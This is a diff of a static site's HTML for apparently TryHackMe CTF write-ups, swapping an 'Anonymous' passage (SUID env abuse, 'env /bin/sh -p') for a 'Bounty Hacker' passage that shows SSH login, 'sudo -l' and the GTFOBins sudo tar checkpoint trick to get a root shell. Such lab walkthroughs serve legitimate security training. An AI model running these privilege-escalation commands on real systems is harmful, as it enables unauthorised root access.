+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ssh</span> <span class="n">lin</span><span class="err">@</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span>
+</span></span></code></pre></div>
 
 <h2 class="relative group">Privilege escalation 
     <div id="privilege-escalation" class="anchor"></div>
     
 </h2>
 <hr>
-<p>Once we&rsquo;re in, we have to adapt the shell to be able to switch the user and use some specific commands.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">script</span> <span class="sr">/dev/nu</span><span class="n">ll</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
-</span></span><span class="line"><span class="cl"><span class="n">export</span> <span class="no">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<p>The first thing to do once we&rsquo;re in, is to <strong>adapt the shell</strong> to be able to execute any command without tty problems.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">export</span> <span class="no">TERM</span><span class="o">=</span><span class="n">xterm</span>
 </span></span><span class="line"><span class="cl"><span class="n">export</span> <span class="no">SHELL</span><span class="o">=</span><span class="n">bash</span>
-</span></span></code></pre></div><p>After gaining an adapted shell, one of the most common ways to escalate privileges are the <strong>SUID binaries</strong>. In order to do that, i&rsquo;m gonna use <strong>find</strong>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">4000</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/nu</span><span class="n">ll</span>
-</span></span></code></pre></div><p>Here we are looking for a binary that is weird to see with suid, in this case is <strong>env</strong>.</p>
+</span></span></code></pre></div><p>The user flag is in <strong>/home/lin/Desktop/</strong>.</p>
 <p>
     <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="./img/8.png" alt="Image 8" />
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/easy/bounty-hacker/img/6_hu62a6d937cdbf6e6e4fc48a24256e5c5a_20815_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/easy/bounty-hacker/img/6_hu62a6d937cdbf6e6e4fc48a24256e5c5a_20815_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/easy/bounty-hacker/img/6_hu62a6d937cdbf6e6e4fc48a24256e5c5a_20815_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/easy/bounty-hacker/img/6_hu62a6d937cdbf6e6e4fc48a24256e5c5a_20815_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/easy/bounty-hacker/img/6_hu62a6d937cdbf6e6e4fc48a24256e5c5a_20815_660x0_resize_box_3.png"
+        alt="Image 6"
+      />
       
     </figure>
 </p>
-<p>In <a href="https://gtfobins.github.io/gtfobins/env/" target="_blank">GTFOBins</a> we can find how to exploit it.</p>
-<p>
+<p>We can look for <strong>sudo permissions</strong> to see what we can execute with sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+</span></span></code></pre></div><p>We&rsquo;ve got sudo permissions on the binary <strong>/bin/tar</strong>.
+
     <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="./img/9.png" alt="Image 9" />
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/easy/bounty-hacker/img/7_hu83d5ed5744afc65abc1d47c4a5d5923f_196476_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/easy/bounty-hacker/img/7_hu83d5ed5744afc65abc1d47c4a5d5923f_196476_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/easy/bounty-hacker/img/7_hu83d5ed5744afc65abc1d47c4a5d5923f_196476_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/easy/bounty-hacker/img/7_hu83d5ed5744afc65abc1d47c4a5d5923f_196476_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/easy/bounty-hacker/img/7_hu83d5ed5744afc65abc1d47c4a5d5923f_196476_660x0_resize_box_3.png"
+        alt="Image 7"
+      />
+      
+    </figure>
+
+In <a href="https://gtfobins.github.io/gtfobins/tar/" target="_blank">GTFOBins</a> there is a command to exploit it.
+
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/easy/bounty-hacker/img/8_hu2d7712d7e5a0bd5fe4928874e2cfdcd0_22253_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/easy/bounty-hacker/img/8_hu2d7712d7e5a0bd5fe4928874e2cfdcd0_22253_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/easy/bounty-hacker/img/8_hu2d7712d7e5a0bd5fe4928874e2cfdcd0_22253_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/easy/bounty-hacker/img/8_hu2d7712d7e5a0bd5fe4928874e2cfdcd0_22253_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/easy/bounty-hacker/img/8_hu2d7712d7e5a0bd5fe4928874e2cfdcd0_22253_660x0_resize_box_3.png"
+        alt="Image 8"
+      />
       
     </figure>
 </p>
-<p>To exploit this SUID binary, we&rsquo;re using the command above but removing the dot and the slash.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">env</span> <span class="sr">/bin/s</span><span class="n">h</span> <span class="o">-</span><span class="nb">p</span>
-</span></span></code></pre></div><p>If we exec a <strong>whoami</strong> we&rsquo;re gonna see that we&rsquo;re the root user now.</p>
-<p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">tar</span> <span class="o">-</span><span class="n">cf</span> <span class="sr">/dev/nu</span><span class="n">ll</span> <span class="sr">/dev/nu</span><span class="n">ll</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">=</span><span class="mi">1</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">-</span><span class="n">action</span><span class="o">=</span><span class="nb">exec</span><span class="o">=</span><span class="sr">/bin/s</span><span class="n">h</span>
+</span></span></code></pre></div><p>Once we execute it we&rsquo;ve the root shell.
+
     <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="./img/10.png" alt="Image 10" />
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/easy/bounty-hacker/img/9_hu01f5708333478d41662cca8222724092_8530_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/easy/bounty-hacker/img/9_hu01f5708333478d41662cca8222724092_8530_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/easy/bounty-hacker/img/9_hu01f5708333478d41662cca8222724092_8530_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/easy/bounty-hacker/img/9_hu01f5708333478d41662cca8222724092_8530_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/easy/bounty-hacker/img/9_hu01f5708333478d41662cca8222724092_8530_660x0_resize_box_3.png"
+        alt="Image 9"
+      />
       
     </figure>
 </p>
@@ -787,11 +846,11 @@ To list the FTP server content, we can use dir and ls.</p>
   
   
 
-  <a href="/writeups/tryhackme/easy/bounty-hacker/" class="min-w-full">
+  <a href="/writeups/tryhackme/medium/anonymous/" class="min-w-full">
     
     <div class="min-h-full border border-neutral-200 dark:border-neutral-700 border-2 rounded overflow-hidden shadow-2xl relative">
         
-        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/writeups/tryhackme/easy/bounty-hacker/featured_hu987505c17c9ba0995f15aab3061797a0_1131773_600x0_resize_box_3.png);"></div>
+        <div class="w-full thumbnail_card_related nozoom" style="background-image:url(/writeups/tryhackme/medium/anonymous/featured_hudfe766e4f70c4f7505e34d3b51d0cf61_12859_600x0_resize_box_3.png);"></div>
         
       
 
@@ -799,7 +858,7 @@ To list the FTP server content, we can use dir and ls.</p>
 
         
         <div class="font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral"
-          href="/writeups/tryhackme/easy/bounty-hacker/">Bounty Hacker</div>
+          href="/writeups/tryhackme/medium/anonymous/">Anonymous</div>
         
 
         <div class="text-sm text-neutral-500 dark:text-neutral-400">
@@ -1017,8 +1076,8 @@ To list the FTP server content, we can use dir and ls.</p>
           
         
       <script>
-        var oid = "views_Writeups\/TryHackMe\/Medium\/Anonymous\/index.md"
-        var oid_likes = "likes_Writeups\/TryHackMe\/Medium\/Anonymous\/index.md"
+        var oid = "views_Writeups\/TryHackMe\/Easy\/Bounty Hacker\/index.md"
+        var oid_likes = "likes_Writeups\/TryHackMe\/Easy\/Bounty Hacker\/index.md"
       </script>
       
       
